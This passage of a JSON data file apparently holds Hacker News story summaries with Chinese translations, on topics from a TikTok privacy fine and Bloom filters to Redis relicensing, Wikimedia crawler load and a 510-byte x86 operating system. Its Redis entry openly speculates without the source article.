    "chinese_summary": "总结：\n\n爱尔兰数据保护委员会（DPC）是欧盟TikTok的主要监管机构，因违反欧盟隐私法，处理儿童数据和跨境数据传输至中国，对该社交媒体平台处以3.45亿欧元（约合3.68亿美元）的罚款。调查重点是TikTok在2020年7月31日至12月31日期间的数据处理行为。\n\nDPC认定TikTok未能充分保护儿童隐私，违反了欧盟《通用数据保护条例》（GDPR）。具体而言，该平台使用“黑暗模式”诱导儿童分享数据，例如默认将账户设置为公开，且未充分告知他们可能接触到的内容性质。\n\n此外，DPC对TikTok将欧洲用户数据传输至中国表示担忧，引发了中国当局可能访问数据的隐私问题。虽然罚款仅直接针对数据处理行为，但用户数据的传输是调查的关键焦点。\n\nTikTok对该决定表示异议，尤其是罚款金额，并表示打算上诉。他们坚称已对其数据处理方式进行了重大更改，以符合GDPR。此次罚款增加了TikTok在全球面临的日益增多的监管挑战，尤其是在数据隐私和安全方面。其他欧洲监管机构也参与了决策过程。"
  },
  {
    "id": "43870926",
    "title": "Why our waistlines expand in middle age: aging stem cells shift into overdrive",
    "url": "https://medicalxpress.com/news/2025-04-waistlines-middle-age-aging-stem.html",
    "summary": "This 2025 article from City of Hope National Medical Center, published in Science, explores the cellular reasons behind the expansion of waistlines in middle age. Researchers found that aging triggers a new type of adult stem cell called committed preadipocytes, age-specific (CP-As), which aggressively produce new fat cells, especially in the abdominal area.\n\nThe study, conducted on mice and validated with human cells, revealed that these CP-As arise in middle age and actively churn out fat cells, explaining age-related weight gain. A signaling pathway called leukemia inhibitory factor receptor (LIFR) was identified as critical in promoting CP-A cell multiplication and fat cell development. Young mice don't require LIFR to make fat, but older mice do, indicating its crucial role in age-related fat accumulation.\n\nThe researchers also identified similar CP-A cells in human tissue from middle-aged individuals, confirming the relevance of their findings to humans. The study highlights the importance of controlling new fat-cell formation to combat age-related obesity. Future research will focus on further studying CP-A cells and developing strategies to eliminate or block them, aiming to prevent age-related fat gain and improve health and longevity. The discovery offers a potential target for therapies aimed at preventing belly fat and improving health during aging.\n",
    "chinese_title": "为何中年腰围变粗：衰老干细胞进入超速运转状态",
    "chinese_summary": "希望之城国家医疗中心2025年发表在《科学》杂志上的文章，探讨了中年腰围增长背后的细胞原因。研究人员发现，衰老会触发一种新的成人干细胞，称为特化前脂肪细胞，年龄特异性（CP-As），它们会积极产生新的脂肪细胞，尤其是在腹部区域。\n\n该研究在小鼠身上进行，并用人体细胞进行了验证，结果表明这些CP-As在中年出现，并积极产生脂肪细胞，解释了与年龄相关的体重增加。一种名为白血病抑制因子受体 (LIFR) 的信号通路被确定为促进 CP-A 细胞繁殖和脂肪细胞发育的关键。幼鼠不需要 LIFR 来制造脂肪，但老鼠需要，表明它在与年龄相关的脂肪积累中起着至关重要的作用。\n\n研究人员还在中年人的组织中发现了类似的人类 CP-A 细胞，证实了他们的发现与人类的相关性。该研究强调了控制新脂肪细胞形成对于对抗与年龄相关的肥胖的重要性。未来的研究将侧重于进一步研究 CP-A 细胞，并开发消除或阻断它们的策略，旨在预防与年龄相关的脂肪增加并改善健康和寿命。这项发现为旨在预防腹部脂肪和改善衰老过程中健康的疗法提供了一个潜在靶点。"
  },
  {
    "id": "43866001",
    "title": "Bloom Filters",
    "url": "https://eli.thegreenplace.net/2025/bloom-filters/",
    "summary": "Bloom filters are probabilistic data structures used for efficient set membership testing. They offer a space- and time-efficient way to determine if an element is *not* in a set, guaranteeing no false negatives. While they can produce false positives (reporting an element as present when it's not), this probability is controllable.\n\nThe core idea involves using an array of bits (m bits long) and k hash functions. To insert an element, each of the k hash functions generates an index within the array, and the corresponding bit is set to 1. To test for membership, the element is hashed similarly, and if all k corresponding bits are 1, the filter returns \"true\"; otherwise, it returns \"false.\"\n\nThe key advantage is speed and space efficiency, especially when most membership tests are negative. The trade-off is the possibility of false positives. The article provides mathematical formulas for calculating the optimal values for 'm' (number of bits) and 'k' (number of hash functions) based on the desired error rate and the expected number of elements. For example, storing 1 billion items with a 1% false positive rate requires approximately 1.2 GB of space and 7 hash functions.\n\nThe article also includes a basic Go implementation of a Bloom filter, showing how it utilizes double hashing to generate the k hash functions and illustrating its practical application in scenarios where disk access is minimized. They are commonly used in database systems like Cassandra to avoid unnecessary disk reads.\n",
    "chinese_title": "布隆过滤器",
    "chinese_summary": "布隆过滤器是一种用于高效集合成员测试的概率型数据结构。 它们提供了一种节省空间和时间的方法来确定元素是否*不在*集合中，保证没有假阴性。 虽然它们可能会产生假阳性（将不存在的元素报告为存在），但这种概率是可控的。\n\n核心思想是使用一个位数组（m 位长）和 k 个哈希函数。 要插入一个元素，每个哈希函数都会在数组中生成一个索引，并将相应的位设置为 1。 要测试成员资格，该元素会被类似地哈希，如果所有 k 个对应的位都是 1，则过滤器返回“真”； 否则，它返回“假”。\n\n主要优点是速度和空间效率，尤其是在大多数成员测试为否定时。 缺点是可能出现假阳性。 本文提供了数学公式，用于根据所需的错误率和预期的元素数量计算 'm'（位数）和 'k'（哈希函数数）的最佳值。 例如，以 1% 的假阳性率存储 10 亿个项目大约需要 1.2 GB 的空间和 7 个哈希函数。\n\n文章还包括一个 Bloom 过滤器的基本 Go 实现，展示了它如何利用双重哈希来生成 k 个哈希函数，并说明了它在最小化磁盘访问的场景中的实际应用。 它们通常用于 Cassandra 等数据库系统中，以避免不必要的磁盘读取。"
  },
  {
    "id": "43851143",
    "title": "RustAssistant: Using LLMs to Fix Compilation Errors in Rust Code",
    "url": "https://www.microsoft.com/en-us/research/publication/rustassistant-using-llms-to-fix-compilation-errors-in-rust-code/",
    "summary": "This article discusses RustAssistant, a tool developed by Microsoft Research that leverages Large Language Models (LLMs) to automatically fix compilation errors in Rust code. Rust, while offering memory and concurrency safety guarantees, presents a steep learning curve due to its unique type system and language features. RustAssistant aims to mitigate this challenge by suggesting fixes for compilation errors, achieving a peak accuracy of approximately 74% on real-world errors found in popular open-source Rust repositories.\n\nThe tool operates in a three-step process: First, it parses the Rust compiler's detailed error messages. Second, it extracts the code snippets relevant to the error, along with the error details, and packages this information into a prompt for the LLM. Third, it sends the prompt to the LLM, which generates a proposed fix in the form of a code diff. RustAssistant then applies this fix to the codebase and re-runs the compiler to verify the resolution. If errors persist, the process iterates, providing updated context to the LLM until the code compiles without errors.\n\nThe careful localization of error information and the iterative interaction between the LLM and the Rust compiler are key to RustAssistant's high accuracy. The article also highlights that the underlying research explores using LLMs for safe low-level programming more broadly, including inferring memory safety invariants in legacy C code.\n",
    "chinese_title": "Rust助手：使用LLM修复Rust代码编译错误",
    "chinese_summary": "本文讨论了RustAssistant，这是微软研究院开发的一种工具，它利用大型语言模型（LLMs）来自动修复Rust代码中的编译错误。Rust虽然提供了内存和并发安全保证，但由于其独特的类型系统和语言特性，学习曲线陡峭。RustAssistant旨在通过建议修复编译错误来缓解这一挑战，在流行的开源Rust仓库中发现的真实错误上，其峰值准确率约为74%。\n\n该工具采用三步流程运行：首先，它解析Rust编译器的详细错误消息。其次，它提取与错误相关的代码片段以及错误详细信息，并将此信息打包成LLM的提示。第三，它将提示发送给LLM，LLM生成以代码差异形式提出的修复方案。然后，RustAssistant将此修复应用于代码库并重新运行编译器以验证解决方案。如果错误仍然存在，该过程会迭代，向LLM提供更新的上下文，直到代码编译时没有错误。\n\n错误信息的仔细定位以及LLM与Rust编译器之间的迭代交互是RustAssistant高准确率的关键。本文还强调，该底层研究更广泛地探索了使用LLM进行安全底层编程，包括推断遗留C代码中的内存安全不变式。"
  },
  {
    "id": "43859536",
    "title": "Claude Integrations",
    "url": "https://www.anthropic.com/news/integrations",
    "summary": "Anthropic has announced significant updates to Claude, focusing on enhanced integration capabilities and advanced research features.\n\n**Integrations:** Claude can now connect to various apps and tools via the Model Context Protocol (MCP), allowing it to access and interact with data from services like Jira, Confluence, Zapier, Cloudflare, Intercom, Asana, Square, Sentry, PayPal, Linear, and Plaid. Developers can also create custom integrations. This gives Claude deeper context about users' work, enabling it to assist with complex projects and automate tasks across different platforms. For example, the Zapier integration allows Claude to access thousands of apps and workflows, while integrations with Jira and Confluence facilitate product development and task management.\n\n**Advanced Research:** Claude's research capabilities have been expanded, allowing it to conduct deeper investigations across web searches, Google Workspace, and now integrated applications. It breaks down requests into smaller parts, delivering comprehensive reports with citations in 5-45 minutes, which the company claims can save hours of manual research. This transparency enables users to verify the source of information used by Claude.\n\n**Availability:** Integrations and advanced Research are currently in beta for Max, Team, and Enterprise plans, and will soon be available on Pro. Web search is now globally available to all paid Claude.ai plans.\n",
    "chinese_title": "Claude 集成",
    "chinese_summary": "Anthropic发布Claude重大更新，着重增强集成能力和高级研究功能。\n\n**集成：** Claude现在可以通过模型上下文协议（MCP）连接到各种应用程序和工具，从而访问和交互来自Jira、Confluence、Zapier、Cloudflare、Intercom、Asana、Square、Sentry、PayPal、Linear和Plaid等服务的数据。开发者还可以创建自定义集成。这使Claude能够更深入地了解用户的工作，从而协助处理复杂的项目并自动执行跨不同平台的任务。 例如，Zapier集成允许Claude访问数千个应用程序和工作流程，而与Jira和Confluence的集成则有助于产品开发和任务管理。\n\n**高级研究：** Claude的研究能力已得到扩展，使其能够跨网络搜索、Google Workspace以及现在集成的应用程序进行更深入的调查。 它将请求分解为更小的部分，并在5-45分钟内提供带有引用的全面报告，该公司声称可以节省数小时的手动研究时间。 这种透明度使用户能够验证Claude所用信息的来源。\n\n**可用性：** 集成和高级研究目前在Max、Team和Enterprise计划中处于测试阶段，并将很快在Pro中提供。 网络搜索现在已在全球范围内向所有付费的Claude.ai计划开放。"
  },
  {
    "id": "43864827",
    "title": "When Americana Doesn't Mean American",
    "url": "https://deeprootsmag.org/2017/09/18/over-there-when-americana-doesnt-mean-american/",
    "summary": "\"When Americana Doesn't Mean American\" explores the concept of Americana music being created and performed by non-American artists, examining how the genre transcends geographical boundaries. It starts with the Leningrad Cowboys, a Finnish band playing American-influenced music, and then delves into the history of the Americana genre itself, born out of frustration with rigid music industry categories in the US. The article highlights the challenges faced by artists who don't fit neatly into established genres.\n\nIt then shifts to the international landscape, using Australia as a case study, illustrating the need for an \"Americana\" category due to the limitations of existing genre classifications. The International Americana Music Show (TIAMS), a podcast showcasing non-American artists playing Americana music, is featured as a resource for exploring this phenomenon. Michael Park, the show's curator, defines \"Americana\" by its derivation from American roots music, regardless of the artist's nationality or language.\n\nThe article highlights that most \"non-American Americana\" comes from English-speaking countries, but also acknowledges its presence in Scandinavia and beyond. Ultimately, it suggests that the crucial question is not just about genre labeling, but about how artists and audiences experience and define \"Americana\" music in a global context. It concludes with a quote from Lilly Drumeva, who doesn't identify as an Americana artist but plays country and bluegrass with European influences.\n",
    "chinese_title": "当美国风不意味着美国制造",
    "chinese_summary": "当“美国风”不意味着美国制造：探讨美国风音乐如何超越地域界限"
  },
  {
    "id": "43867429",
    "title": "Vatican Observatory",
    "url": "https://www.vaticanobservatory.org/telescopes/va/",
    "summary": "The Vatican Observatory, one of the oldest astronomical observatories, traces its origins back to 1582. Today, it houses a team of Jesuit scientists from around the world who conduct cutting-edge research on diverse topics ranging from interplanetary dust to the origins of the universe, contributing significantly to planetary science, cosmology, philosophy, and stellar/extragalactic astronomy.\n\nWhile headquartered at Castel Gandolfo near Rome, the Observatory also operates the Vatican Observatory Research Group in Tucson, Arizona, a hub for observational astronomy. Most modern observational research occurs at the Observatory's telescope on Mt. Graham in Arizona.\n\nIn addition to housing historic telescopes, the Castel Gandolfo location contains a significant archive of astronomical photographic plates from the late 19th century, a library with important scientific works, a collection of antique astronomical instruments, and a world-renowned meteorite collection studied in a modern laboratory.\n",
    "chinese_title": "梵蒂冈天文台",
    "chinese_summary": "梵蒂冈天文台是历史最悠久的天文台之一，其起源可以追溯到1582年。如今，它汇集了来自世界各地的耶稣会科学家团队，他们对从行星际尘埃到宇宙起源等各种课题进行前沿研究，为行星科学、宇宙学、哲学以及恒星/河外天文学做出了重大贡献。\n\n天文台总部位于罗马附近的冈道夫堡，同时还在亚利桑那州图森市运营着梵蒂冈天文台研究小组，该小组是观测天文学的中心。大多数现代观测研究都在天文台位于亚利桑那州格雷厄姆山的望远镜上进行。\n\n除了收藏着具有历史意义的望远镜外，冈道夫堡还保存着大量19世纪末的天文照片底片档案、一个藏有重要科学著作的图书馆、一批古董天文仪器，以及一个在现代实验室中进行研究的世界闻名的陨石收藏。"
  },
  {
    "id": "43870574",
    "title": "Anthropic Development Partner Program",
    "url": "https://support.anthropic.com/en/articles/11174108-about-the-development-partner-program",
    "summary": "The Anthropic Development Partner Program offers organizations a voluntary way to contribute to the improvement of Claude's AI capabilities, specifically in coding, while retaining control over their data. By opting in, organizations allow Anthropic to use their Claude Code sessions (input and output tokens from Anthropic's first-party API only) for model training. This data sharing helps Anthropic enhance Claude's coding capabilities, improve models based on developer workflows, and advance AI-assisted coding. Data is stored securely for up to 2 years, and data used for model training is not associated with other customer information. All members of the participating organization are informed of their enrollment.\n\nA key incentive for joining is a 30% discount on Claude 3.5 Sonnet and Claude 3.7 Sonnet Claude Code input tokens (standard, cache write, and cache read), provided OAuth is used. This discount runs until July 31, 2025. Organizations can leave the program at any time, although previously shared data cannot be deleted.\n\nThe process for opting in or out depends on the billing type. For prepaid billing accounts, administrators can manage participation through the \"Privacy controls\" section in their Console account. Invoice billing accounts must contact their Anthropic account executive to determine eligibility. Accounts with zero data retention agreements are ineligible for the program.\n",
    "chinese_title": "Anthropic开发伙伴计划",
    "chinese_summary": "Anthropic开发伙伴计划为组织提供一种自愿方式，在保持对其数据控制的同时，为改进Claude的AI能力（尤其是在编码方面）做出贡献。选择加入后，组织允许Anthropic使用其Claude Code会话（仅限Anthropic第一方API的输入和输出tokens）进行模型训练。这种数据共享有助于Anthropic增强Claude的编码能力，改进基于开发者工作流程的模型，并推进AI辅助编码。数据安全存储最多2年，且用于模型训练的数据不与其他客户信息关联。参与组织的全体成员均会获悉其已加入该计划。\n\n加入的主要激励是Claude 3.5 Sonnet和Claude 3.7 Sonnet Claude Code输入tokens（标准、缓存写入和缓存读取）享受30%的折扣，前提是使用OAuth。此折扣有效期至2025年7月31日。组织可以随时退出该计划，但之前共享的数据无法删除。\n\n加入或退出的流程取决于账单类型。对于预付费账单帐户，管理员可以通过其Console帐户中的“隐私控制”部分管理参与情况。发票账单帐户必须联系其Anthropic客户经理以确定资格。具有零数据保留协议的帐户没有资格参与该计划。"
  },
  {
    "id": "43859446",
    "title": "Redis is open source again",
    "url": "https://antirez.com/news/151",
    "summary": "This article, titled \"Redis is open source again,\" likely announces a significant shift in the licensing or management of the Redis database. The core message is that Redis, a popular in-memory data structure store, has returned to an open-source model.\n\nWithout the full article, it's impossible to know the specifics, but here are likely key elements that could be inferred:\n\n*   **Redis was previously open source:** The \"again\" implies that Redis was originally open source.\n*   **Change in licensing:** This usually involves moving away from a proprietary or source-available license to a license more aligned with traditional open-source definitions (e.g., BSD, Apache, GPL).\n*   **Reasons for the change (inferred):** The article would likely discuss the reasons behind the return to open source. This could be community pressure, a change in business strategy, or a desire to foster wider adoption and contributions.\n*   **Impact on users:** The article would probably explain how this change affects existing Redis users and developers. This could include changes to licensing fees, access to features, and the community governance of the project.\n*   **Future direction (inferred):** The article might hint at the future roadmap for Redis and how the open-source model will influence its development.\n\nIn short, the article conveys that Redis is now, once again, accessible and governed by an open-source approach. This is a significant development that likely has broad implications for the Redis ecosystem.\n",
    "chinese_title": "Redis 再次开源",
    "chinese_summary": "文章《Redis再次开源》很可能宣布了Redis数据库在许可或管理方面的一项重大转变。其核心信息是，作为一种流行的内存数据结构存储，Redis已经回归开源模式。\n\n在没有完整文章的情况下，无法得知具体细节，但以下是可能推断出的关键要素：\n\n*   **Redis此前是开源的：** “再次”意味着Redis最初就是开源的。\n*   **许可变更：** 这通常涉及从专有或源码可用许可转向更符合传统开源定义的许可（例如，BSD、Apache、GPL）。\n*   **变更的原因（推断）：** 文章很可能会讨论回归开源背后的原因。这可能是社区压力、业务战略的改变，或者渴望促进更广泛的采用和贡献。\n*   **对用户的影响：** 文章可能会解释这种变化如何影响现有的Redis用户和开发者。这可能包括许可费用、功能访问以及项目社区治理的变化。\n*   **未来方向（推断）：** 文章可能会暗示Redis的未来发展路线图，以及开源模式将如何影响其发展。\n\n简而言之，文章传达了Redis现在又一次可以通过开源方式访问和管理。这是一项重大进展，很可能对Redis生态系统产生广泛的影响。"
  },
  {
    "id": "43871998",
    "title": "Universal Antivenom May Grow Out of Man Who Let Snakes Bite Him 100s of Times",
    "url": "https://www.nytimes.com/2025/05/02/health/snakes-universal-antivenom-tim-friede.html",
    "summary": "Tim Friede, a 57-year-old man from Wisconsin, has spent nearly two decades injecting himself with and being bitten by venomous snakes to build immunity. He has allowed snakes to bite him around 200 times, sometimes even letting two bite him simultaneously. This seemingly reckless behavior might lead to a major breakthrough in global health: a universal antivenom.\n\nScientists have identified antibodies in Friede's blood that can neutralize the venom of multiple snake species. This discovery, published in the journal *Cell*, is a significant step towards developing a universal antivenom. Currently, snakebites affect up to 2.7 million people annually, causing around 120,000 deaths and maiming 400,000 others, and these numbers are likely underestimates. The development of a universal antivenom could significantly reduce these figures.\n\nFriede's motivation stems from a desire to help people he will likely never meet who are affected by venomous snakebites. His efforts and the subsequent scientific findings offer hope for a more effective and widely accessible treatment for snake venom poisoning.\n",
    "chinese_title": "通用抗蛇毒血清或将出自被蛇咬上百次之人",
    "chinese_summary": "威斯康星州57岁的蒂姆·弗里德近二十年来一直通过给自己注射毒液和被毒蛇咬伤来建立免疫力。他允许蛇咬他约200次，有时甚至同时让两条蛇咬他。这种看似鲁莽的行为可能带来全球健康领域的重大突破：一种通用抗蛇毒血清。\n\n科学家们在弗里德的血液中发现了可以中和多种蛇类毒液的抗体。这项发表在《细胞》杂志上的发现，是开发通用抗蛇毒血清的重要一步。目前，每年有高达270万人受到蛇咬伤的影响，导致约12万人死亡和40万人残疾，而这些数字可能被低估了。通用抗蛇毒血清的开发可以显著降低这些数字。\n\n弗里德的动机源于帮助那些他可能永远不会遇到的、受毒蛇咬伤影响的人。他的努力和随后的科学发现为更有效、更广泛使用的蛇毒中毒治疗方法带来了希望。"
  },
  {
    "id": "43869045",
    "title": "Settling the File Structure Debate",
    "url": "https://muhammedsari.me/settling-the-file-structure-debate",
    "summary": "This article tackles the debate on file structure organization, arguing that **context-driven grouping** is superior to type-based grouping for long-term maintainability and clarity. It uses the example of an Identity and Access Management (IAM) system to illustrate the principles.\n\nThe article asserts that a good file structure should prioritize **ease of change, screaming architecture, and clear-cut knowledge boundaries**. While acknowledging that file structure is subjective, it posits that some approaches are more effective at achieving these goals.\n\nThe author contrasts **grouping files by type** (e.g., models, repositories) with **grouping by context or process** (e.g., User Registration, Email Verification).  While type-based grouping may simplify finding specific file types, it obscures the application's domain logic and makes it harder to navigate and understand the system's purpose, especially for non-developers.\n\nThe article advocates for organizing files according to business processes or contexts.  This approach, demonstrated with the IAM example and a Deep Linking module, allows developers to quickly locate code related to specific features or user workflows, even based on simple problem descriptions. The context-driven structure emphasizes the system's purpose and boundaries, facilitating maintainability and reducing the risk of duplicated knowledge. A \"Contract\" directory is introduced as a point of dependency for external access, encapsulating internal implementation details.  The author concludes that the best approach depends on the team's goals and scale but that context-driven organization generally offers better clarity, navigability, and support for long-term maintainability.\n",
    "chinese_title": "解决文件结构之争",
    "chinese_summary": "本文探讨了文件结构组织的争论，认为**上下文驱动分组**比基于类型分组更利于长期维护和清晰度。文章以身份和访问管理（IAM）系统为例，阐述了相关原则。\n\n文章认为，良好的文件结构应优先考虑**易于变更、鲜明的架构和明确的知识边界**。虽然承认文件结构具有主观性，但文章认为某些方法在实现这些目标方面更有效。\n\n作者将**按类型分组文件**（例如，模型、存储库）与**按上下文或流程分组文件**（例如，用户注册、电子邮件验证）进行了对比。虽然基于类型分组可能简化查找特定文件类型，但它掩盖了应用程序的领域逻辑，并且使得导航和理解系统的目的更加困难，尤其对于非开发人员而言。\n\n文章提倡根据业务流程或上下文组织文件。这种方法，通过IAM示例和Deep Linking模块进行演示，使得开发人员能够根据简单的描述快速定位与特定功能或用户工作流程相关的代码。上下文驱动的结构强调了系统的目的和边界，有助于维护并降低重复知识的风险。文章引入了一个“Contract”目录作为外部访问的依赖点，封装了内部实现细节。作者总结道，最佳方法取决于团队的目标和规模，但上下文驱动的组织通常提供更好的清晰度、可导航性和对长期维护的支持。"
  },
  {
    "id": "43865132",
    "title": "Third party cookies must be removed",
    "url": "https://w3ctag.github.io/web-without-3p-cookies/",
    "summary": "This document, a consensus finding by the W3C Technical Architecture Group (TAG), argues for the removal of third-party cookies from the web platform to enhance user privacy. It highlights that while cookies were originally designed for website functionality, third-party cookies have become a key technology in enabling cross-site tracking networks, leading to decreased privacy and centralized data control.\n\nThe document acknowledges the complications of removing third-party cookies, as they currently support essential web features such as federated identity, cross-site resource authorization, and fraud mitigation. It emphasizes the need to replace them with purpose-built, privacy-respecting technologies rather than general-purpose replacements that could recreate the same privacy issues.\n\nThe TAG calls for all browsers to drop support for third-party cookies and urges specification authors to ensure that new web platform technologies do not undermine the benefits of this removal. Proposals for replacement technologies must provide concrete evidence of preserved individual and collective privacy, especially those involving profiling, cross-context recognition, or data aggregation. The document stresses the importance of multi-implementer support and independent review of these proposals to ensure they genuinely improve privacy. The TAG also warns against mechanisms that could be abused with cookies, fingerprinting, or other tools for privacy invasion, and it emphasizes the urgency of a strict timeline for third-party cookie removal.\n",
    "chinese_title": "必须移除第三方Cookie。",
    "chinese_summary": "W3C技术架构组(TAG)的共识性发现认为，为了增强用户隐私，应从Web平台中移除第三方Cookie。 该文档指出，虽然Cookie最初是为网站功能而设计的，但第三方Cookie已成为实现跨站点跟踪网络的关键技术，导致隐私降低和数据控制集中化。\n\n该文档承认移除第三方Cookie的复杂性，因为它们目前支持重要的Web功能，如联合身份、跨站点资源授权和欺诈缓解。它强调需要用专门构建的、尊重隐私的技术来取代它们，而不是可能重塑相同隐私问题的通用替代方案。\n\nTAG呼吁所有浏览器停止支持第三方Cookie，并敦促规范制定者确保新的Web平台技术不会破坏移除第三方Cookie带来的好处。 替代技术的提案必须提供保留个人和集体隐私的具体证据，特别是那些涉及剖析、跨上下文识别或数据聚合的提案。 该文档强调多方实施支持和独立审查这些提案的重要性，以确保它们真正改善隐私。 TAG还警告说，要警惕可能被Cookie、指纹识别或其他隐私侵犯工具滥用的机制，并强调制定严格的第三方Cookie移除时间表的重要性。"
  },
  {
    "id": "43866585",
    "title": "Show HN: OSle – A 510 bytes OS in x86 assembly",
    "url": "https://github.com/shikaan/osle",
    "summary": "This \"Show HN\" post introduces OSle, a remarkably tiny (510 bytes) real-mode operating system written in x86 assembly that fits within a boot sector. Despite its small size, OSle boasts essential features like a shell, a file system (read, write, find), cooperative process management, and userland software.\n\nThe post encourages users to try OSle out in the browser and provides instructions on creating custom OSle programs using the included Software Development Kit (SDK). The SDK offers definitions and a toolchain for program creation.\n\nThe post details development setup, requiring NASM, GNU Make, and optionally, Bochs. It provides installation instructions for macOS (via Homebrew) and Linux (via package managers like apt). Clear instructions are included for building and running OSle using either Bochs or QEMU, as well as for compiling, bundling, and running custom OSle programs.\n\nFinally, the post warns about the risks involved in writing the OSle image to a real device using `dd`, emphasizes the MIT license, and invites contributions through issues and pull requests.\n",
    "chinese_title": "Show HN: OSle – 510字节 x86 汇编操作系统",
    "chinese_summary": "这个“Show HN”帖子介绍了 OSle，一个非常小的（510 字节）实模式操作系统，用 x86 汇编编写，可以装入引导扇区。 尽管体积小巧，OSle 仍具备基本功能，如 shell、文件系统（读、写、查找）、协作式进程管理和用户态软件。\n\n该帖子鼓励用户在浏览器中试用 OSle，并提供了使用随附的软件开发工具包 (SDK) 创建自定义 OSle 程序的说明。 SDK 提供了程序创建的定义和工具链。\n\n该帖子详细介绍了开发环境设置，需要 NASM、GNU Make，以及可选的 Bochs。 它提供了 macOS（通过 Homebrew）和 Linux（通过 apt 等软件包管理器）的安装说明。 其中包含使用 Bochs 或 QEMU 构建和运行 OSle，以及编译、捆绑和运行自定义 OSle 程序的明确说明。\n\n最后，该帖子警告了使用 `dd` 将 OSle 镜像写入真实设备的风险，强调了 MIT 许可证，并邀请通过问题和 pull request 贡献代码。"
  },
  {
    "id": "43868876",
    "title": "Crawlers impact the operations of the Wikimedia projects",
    "url": "https://diff.wikimedia.org/2025/04/01/how-crawlers-impact-the-operations-of-the-wikimedia-projects/",
    "summary": "This article discusses the increasing impact of crawlers, particularly those used to train AI models, on Wikimedia's infrastructure and operations since early 2024. The demand for Wikimedia content, especially multimedia files, has surged due to these bots scraping data, leading to a 50% increase in multimedia bandwidth usage, unrelated to human readers.\n\nThe article highlights an incident following Jimmy Carter's death where a surge in traffic due to video views, combined with the already elevated baseline traffic from bots, nearly overloaded Wikimedia's network.\n\nThe core issue is that these bots \"bulk read\" content, accessing less popular pages and bypassing caching mechanisms, thus straining Wikimedia's core data centers and consuming disproportionately more resources.  The article notes that 65% of the most expensive traffic to the core datacenters originates from bots, despite bots only accounting for 35% of overall pageviews. This disrupts the Site Reliability team and diverts resources away from supporting the Wikimedia projects and human users.\n\nBeyond the Wikimedia projects themselves, these crawlers also target developer infrastructure like code review platforms and bug trackers.\n\nThe article stresses that while Wikimedia content is free, its infrastructure is not.  It calls for establishing responsible use guidelines, exploring supported access channels for developers, and incentivizing responsible content reuse. Wikimedia is actively working on systemic solutions, emphasizing the need to re-establish a healthy balance to prioritize the Wikimedia projects, contributors, and human access to knowledge.\n",
    "chinese_title": "网络爬虫对维基媒体项目的运作有影响。",
    "chinese_summary": "自2024年初以来，爬虫（特别是用于训练AI模型的爬虫）对维基媒体基础设施和运营的影响日益增大。由于这些机器人抓取数据，对维基媒体内容（尤其是多媒体文件）的需求激增，导致多媒体带宽使用量增加了50%，这与人类读者无关。\n\n文章重点介绍了吉米·卡特去世后发生的一起事件，由于视频观看流量激增，再加上机器人已经造成的流量基线升高，几乎使维基媒体的网络不堪重负。\n\n核心问题是这些机器人“批量读取”内容，访问不太受欢迎的页面并绕过缓存机制，从而给维基媒体的核心数据中心带来压力，并消耗不成比例的资源。文章指出，尽管机器人仅占总页面浏览量的35%，但流向核心数据中心的最昂贵流量中有65%来自机器人。这扰乱了站点可靠性团队的工作，并将资源从支持维基媒体项目和人类用户转移开。\n\n除了维基媒体项目本身，这些爬虫还瞄准了开发人员基础设施，如代码审查平台和缺陷跟踪器。\n\n文章强调，虽然维基媒体的内容是免费的，但其基础设施并非如此。文章呼吁建立负责任的使用指南，探索支持开发人员的访问渠道，并鼓励负责任的内容重用。维基媒体正在积极制定系统性解决方案，强调需要重新建立健康的平衡，以优先支持维基媒体项目、贡献者以及人类对知识的访问。"
  },
  {
    "id": "43851260",
    "title": "New species of methane-producing archaea discovered in the human gut",
    "url": "https://phys.org/news/2025-04-microbiologists-species-methane-archaea-human.html",
    "summary": "In April 2025, microbiologists announced the discovery of a new species of methane-producing archaea, *Methanobrevibacter intestini*, in the human gut, along with a novel variant of *Methanobrevibacter smithii* named GRAZ-2. This research, conducted by an international team from the Medical University of Graz, the DSMZ, and the University of Illinois, highlights the importance of archaea in the gut microbiome, an area often overshadowed by bacteria research.\n\nArchaea, while resembling bacteria, have distinct differences in cell structure and metabolic pathways. Methanogens, a type of archaea, produce methane from simple compounds and play a significant role in microbial metabolic processes.\n\n*Methanobrevibacter intestini* WWM1085, the newly discovered species, thrives in anaerobic conditions and produces methane and succinic acid, the latter of which has been linked to inflammatory processes. The GRAZ-2 variant produces formic acid, potentially impacting the metabolism of other gut inhabitants.\n\nThe researchers emphasize that these discoveries demonstrate the complexity and relevance of archaea in the human gut, potentially influencing gut function, gas metabolism, and disease development. They used advanced techniques like anaerobic cultivation, electron microscopy, and DNA sequencing to isolate and characterize these organisms. The study underscores the need for further research on the \"archaeome\" to understand its connection to human health and to develop potential therapeutic interventions. Cultivating and studying these strains is crucial for understanding their roles in health and disease, paving the way for personalized microbiome medicine.\n",
    "chinese_title": "人体肠道中发现甲烷生成古菌新物种",
    "chinese_summary": "2025年4月，微生物学家宣布在人类肠道中发现了一种新的产甲烷古菌——*Methanobrevibacter intestini*，以及一种名为GRAZ-2的新型*Methanobrevibacter smithii*变种。 这项由格拉茨医科大学、德国微生物菌种保藏中心（DSMZ）和伊利诺伊大学组成的国际团队进行的研究，凸显了古菌在肠道微生物群中的重要性，这一领域通常被细菌研究的光芒所掩盖。\n\n古菌虽然与细菌相似，但在细胞结构和代谢途径上存在明显差异。 产甲烷菌是古菌的一种，它们通过简单化合物产生甲烷，并在微生物代谢过程中发挥重要作用。\n\n新发现的物种*Methanobrevibacter intestini* WWM1085在厌氧条件下生长旺盛，产生甲烷和琥珀酸，后者与炎症过程有关。 GRAZ-2变种产生甲酸，可能影响其他肠道居民的代谢。\n\n研究人员强调，这些发现表明古菌在人类肠道中的复杂性和相关性，可能影响肠道功能、气体代谢和疾病发展。 他们使用厌氧培养、电子显微镜和DNA测序等先进技术来分离和鉴定这些生物。 该研究强调需要进一步研究“古菌组”，以了解其与人类健康的联系，并开发潜在的治疗干预措施。 培养和研究这些菌株对于了解它们在健康和疾病中的作用至关重要，为个性化微生物组医学铺平了道路。"
  },
  {
    "id": "43855838",
    "title": "Owen Le Blanc: creator of the first Linux distribution",
    "url": "https://lwn.net/Articles/1017846/",
